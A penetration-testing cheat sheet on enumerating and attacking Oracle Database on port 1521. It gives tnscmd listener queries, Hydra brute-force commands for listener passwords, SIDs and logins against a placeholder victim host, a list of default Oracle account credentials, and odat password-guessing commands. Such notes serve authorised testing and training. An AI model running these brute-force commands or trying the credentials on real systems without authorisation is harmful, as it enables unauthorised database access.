# 1521 - ORACLE\_DB

### Overview

Oracle Database (commonly referred to as Oracle RDBMS or simply as Oracle) is a multi-model database management system produced and marketed by Oracle Corporation.

### 1. TNS-Listener:

When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP). For this we have a simple tool called **tnscmd.**

```bash
tnscmd.pl status -h <IP_Address>
```

* If you receive an error while this connection, the listener may be password protected.
  * If **Password Protected,** use **hydra**.

### 2. Hydra & Oracle Listener:

Use the following command to bruteforce using **Hydra.**

```bash
./hydra -P -t -s 1521 (target default port) oracle-listener
```

* Example:

```bash
./hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
```

### 3. Enumerating the SID <a href="#4f50" id="4f50"></a>

#### What is a SID <a href="#fb45" id="fb45"></a>

The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.

So how do we enumerate SIDs, first there is a brilliant tool from cqure.net called **OScanner**, but we can also use **Hydra** and **Metasploit**.

* Use the following command syntax to brute-force SIDs

```bash
./hydra -L <File of SIDs> -s 1521 (target default port) <target> oracle-sid
```

### 4. Targeting Accounts:

**Got SID?** Excellent, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.

### **- Default Passwords**

Below are some of the default passwords associated with Oracle:

* **DBSNMP/DBSNMP** — Intelligent Agent uses this to talk to the db server (its some work to change it)
* **SYS/CHANGE\_ON\_INSTALL** — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!
* **PCMS\_SYS/PCMS\_SYS** — Default x account
* **WMSYS/WMSYS** — Default x account
* **OUTLN/OUTLN** — Default x account
* **SCOTT/TIGER** — Default x account

Other **default passwords** can be found [here ](http://www.petefinnigan.com/default/oracle\_default\_passwords.htm)and [here](https://cirt.net/passwords?vendor=Oracle).

### Hydra & Oracle SQL-Login <a href="#651e" id="651e"></a>

**Example**:

```
./hydra -L /tmp/user.txt -P /tmp/pass.txt -s 1521 host.victim oracle /PLSEXTPROC
```

### Using odat:

```bash
odat.py passwordguesser -s IP_ADD -d SID
```

### 5. One for All:

* All of the things discussed earlier can be done using a tool called **odat.**

